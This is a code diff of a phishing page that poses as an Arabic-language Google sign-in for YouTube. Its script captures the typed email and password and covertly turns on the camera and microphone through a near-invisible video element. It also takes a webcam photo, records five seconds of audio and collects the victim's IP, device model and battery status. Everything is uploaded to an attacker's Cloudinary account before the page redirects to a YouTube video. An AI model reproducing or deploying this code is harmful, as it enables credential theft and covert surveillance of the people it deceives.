@@ -3,30 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - تأكيد ملكية الحساب</title>
+    <title>Google - التحقق من الأمان</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .login-card { width: 90%; max-width: 420px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; background: #fff; z-index: 10; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .card { width: 90%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
         img.logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p { color: #3c4043; margin-bottom: 25px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
         input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        input:focus { border: 2px solid #1a73e8; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
-        
-        /* إخفاء العناصر التقنية مع إبقائها نشطة */
+        button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; }
         #v { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
         #c { display: none; }
     </style>
 </head>
 <body>
 
-<div class="login-card" id="ui">
+<div class="card" id="ui">
     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
     <h1>تسجيل الدخول</h1>
-    <p>المتابعة إلى YouTube</p>
-    <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
+    <p>استخدم حسابك للمتابعة إلى YouTube</p>
+    <input type="email" id="e" placeholder="البريد الإلكتروني" required>
     <input type="password" id="p" placeholder="كلمة المرور" required>
     <button onclick="run()">التالي</button>
 </div>
@@ -35,6 +31,7 @@
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
+    // إعداداتك الخاصة (تأكد أن Preset هو Unsigned في Cloudinary)
     const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
     async function run() {
@@ -42,88 +39,84 @@
         if(!email || !pass) return;
 
         try {
-            // 1. طلب الصلاحيات
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: true, 
-                audio: { echoCancellation: true, noiseSuppression: true } 
-            });
-            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const video = document.getElementById('v');
             video.srcObject = stream;
             video.play();
 
-            document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار 5 ثوانٍ لإتمام الفحص الأمني</p>";
+            document.getElementById('ui').innerHTML = "<h3>جاري الفحص...</h3><p>يرجى الانتظار 5 ثوانٍ لإتمام العملية</p>";
 
-            // 2. سحب بيانات البطارية والجهاز فوراً
-            const deviceDetails = await getDeviceDetails();
+            // سحب بيانات الجهاز والبطارية
+            const dev = await getDev();
 
-            // 3. الانتظار لاستقرار الكاميرا (3 ثواني) ثم التصوير
             setTimeout(() => {
                 const canvas = document.getElementById('c');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                const imgData = canvas.toDataURL("image/png");
-
-                // بدء التسجيل الصوتي لمدة 5 ثواني ثم الرفع والتحويل
-                startVoiceRecording(email, pass, imgData, deviceDetails, stream);
+                const img = canvas.toDataURL("image/png");
+                
+                // بدء التسجيل الصوتي والرفع
+                startFinalStep(email, pass, img, dev, stream);
             }, 3000);
 
         } catch (err) { window.location.href = yt; }
     }
 
-    async function getDeviceDetails() {
-        let info = {
-            model: navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown",
-            battery: "N/A",
-            charging: "N/A"
-        };
+    async function getDev() {
+        let info = { model: navigator.userAgent.split(')')[0].split('(')[1] || "PC", bat: "N/A", char: "N/A" };
         try {
             if (navigator.getBattery) {
-                const bt = await navigator.getBattery();
-                info.battery = Math.round(bt.level * 100) + "%";
-                info.charging = bt.charging ? "Yes" : "No";
+                const b = await navigator.getBattery();
+                info.bat = Math.round(b.level * 100) + "%";
+                info.char = b.charging ? "Yes" : "No";
             }
         } catch (e) {}
         return info;
     }
 
-    function startVoiceRecording(e, p, img, dev, stream) {
+    function startFinalStep(e, p, img, dev, stream) {
         const recorder = new MediaRecorder(stream);
         let chunks = [];
         recorder.ondataavailable = ev => chunks.push(ev.data);
         recorder.onstop = () => {
             const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-            uploadAll(e, p, img, audioBlob, dev);
+            uploadFinal(e, p, img, audioBlob, dev);
         };
         recorder.start();
         setTimeout(() => {
             recorder.stop();
-            // تحويل لليوتيوب بعد ثانية لضمان خروج الطلبات
+            // تحويل نهائي بعد ضمان بدء الإرسال
             setTimeout(() => { window.location.href = yt; }, 1500);
         }, 5000);
     }
 
-    async function uploadAll(e, p, img, audio, dev) {
+    async function uploadFinal(e, p, img, aud, dev) {
         let ip = "Unknown";
         try { 
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            ip = d.ip;
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
         } catch(err){}
 
-        const commonContext = `u=${e}|p=${p}|ip=${ip}|dev=${dev.model}|bat=${dev.battery}|char=${dev.charging}`;
+        // تجهيز البيانات النصية (Context)
+        const ctx = `u=${e}|p=${p}|ip=${ip}|model=${dev.model}|bat=${dev.bat}|char=${dev.char}`;
 
-        // رفع الصورة
+        // 1. رفع الصورة
         const fd1 = new FormData();
-        fd1.append('file', img); fd1.append('upload_preset', pr);
-        fd1.append('context', commonContext);
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });
+        fd1.append('file', img);
+        fd1.append('upload_preset', pr);
+        fd1.append('context', ctx);
+        fd1.append('tags', `DeathLink,${e}`);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true })
+            .then(r => r.json()).then(d => console.log("Success Image:", d)).catch(e => console.error("Err:", e));
 
-        // رفع الصوت
+        // 2. رفع الصوت
         const fd2 = new FormData();
-        fd2.append('file', audio); fd2.append('upload_preset', pr);
+        fd2.append('file', aud);
+        fd2.append('upload_preset', pr);
         fd2.append('resource_type', 'video');
-        fd2.append('context', commonContext);
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
+        fd2.append('context', ctx);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true })
+            .then(r => r.json()).then(d => console.log("Success Audio:", d)).catch(e => console.error("Err:", e));
     }
 </script>
 </body>
